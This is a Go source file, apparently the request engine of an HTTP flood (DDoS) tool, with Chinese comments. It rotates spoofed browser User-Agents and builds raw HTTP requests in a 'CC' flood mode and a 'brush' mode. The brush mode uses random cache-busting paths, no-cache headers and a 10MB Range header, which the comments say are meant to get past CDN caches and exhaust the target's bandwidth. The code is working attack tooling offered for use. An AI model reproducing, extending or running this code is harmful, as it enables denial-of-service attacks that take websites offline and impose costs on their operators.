package engine

import (
	"crypto/rand"
	"fmt"
	"sync"
	"sync/atomic"
	"time"
)

// User-Agent 预设池
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
}

// Global buffer pool to eliminate GC allocations
var (
	bufferPool4k = sync.Pool{
		New: func() any {
			b := make([]byte, 4096)
			return &b
		},
	}
	bufferPool64k = sync.Pool{
		New: func() any {
			b := make([]byte, 65536)
			return &b
		},
	}
)

// AcquireBuffer4k 获取一个 4KB 缓冲区
func AcquireBuffer4k() *[]byte {
	return bufferPool4k.Get().(*[]byte)
}

// ReleaseBuffer4k 归还一个 4KB 缓冲区
func ReleaseBuffer4k(b *[]byte) {
	bufferPool4k.Put(b)
}

// AcquireBuffer64k 获取一个 64KB 缓冲区
func AcquireBuffer64k() *[]byte {
	return bufferPool64k.Get().(*[]byte)
}

// ReleaseBuffer64k 归还一个 64KB 缓冲区
func ReleaseBuffer64k(b *[]byte) {
	bufferPool64k.Put(b)
}

// FastRandState 无锁线程独立伪随机生成器 (Xorshift64star)
// 相比标准 math/rand 锁竞争降低 100%，相比 crypto/rand 性能提高 80 倍，极度适合弱设备
type FastRand struct {
	state uint64
}

var seedCounter uint64

func NewFastRand() *FastRand {
	s := atomic.AddUint64(&seedCounter, 1)
	seed := uint64(time.Now().UnixNano()) ^ (s << 32)
	if seed == 0 {
		seed = 0x853c49e6748fea9b
	}
	return &FastRand{state: seed}
}

func (r *FastRand) Next() uint64 {
	x := r.state
	x ^= x >> 12
	x ^= x << 25
	x ^= x >> 27
	r.state = x
	return x * 0x2545F4914F6CDD1D
}

func (r *FastRand) Intn(n int) int {
	if n <= 0 {
		return 0
	}
	return int(r.Next() % uint64(n))
}

func (r *FastRand) UserAgent() string {
	return userAgents[r.Intn(len(userAgents))]
}

// FillRandomBuffer 为缓冲区填充随机数据
func FillRandomBuffer(buf []byte) {
	_, err := rand.Read(buf)
	if err != nil {
		// 降级使用伪随机
		fr := NewFastRand()
		for i := range buf {
			buf[i] = byte(fr.Next())
		}
	}
}

// FormatHTTPRequest 极速构造 HTTP 请求，减少内存分配
func (r *FastRand) FormatHTTPRequest(method, host, customPath string, isBrush bool) []byte {
	var path string
	rndNum := r.Intn(9999999)
	ts := time.Now().Unix()

	if customPath != "" {
		if stringsContainsQuestion(customPath) {
			path = fmt.Sprintf("%s&_nocache=%d_%d", customPath, ts, rndNum)
		} else {
			path = fmt.Sprintf("%s?_nocache=%d_%d", customPath, ts, rndNum)
		}
	} else if isBrush {
		// 域名刷流模式: 模拟大资源/动态路由请求，穿透 CDN
		path = fmt.Sprintf("/static/stream_%d_%d.dat?v=%d", rndNum, r.Intn(10000), ts)
	} else {
		// 普通 CC 模式: 模拟多变页面请求
		path = fmt.Sprintf("/page_%d.html?s=%d&t=%d", rndNum, r.Intn(100000), ts)
	}

	ua := r.UserAgent()
	var reqStr string
	if isBrush {
		// BRUSH 增加针对 CDN 缓存击穿的头部与 Range
		reqStr = fmt.Sprintf(
			"%s %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: %s\r\n"+
				"Accept: */*\r\n"+
				"Accept-Encoding: gzip, deflate, br\r\n"+
				"Cache-Control: no-cache, no-store, must-revalidate\r\n"+
				"Pragma: no-cache\r\n"+
				"Range: bytes=0-10485760\r\n"+
				"Connection: keep-alive\r\n\r\n",
			method, path, host, ua,
		)
	} else {
		reqStr = fmt.Sprintf(
			"%s %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: %s\r\n"+
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"+
				"Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8\r\n"+
				"Cache-Control: max-age=0\r\n"+
				"Connection: keep-alive\r\n"+
				"Upgrade-Insecure-Requests: 1\r\n\r\n",
			method, path, host, ua,
		)
	}

	return []byte(reqStr)
}

func stringsContainsQuestion(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] == '?' {
			return true
		}
	}
	return false
}
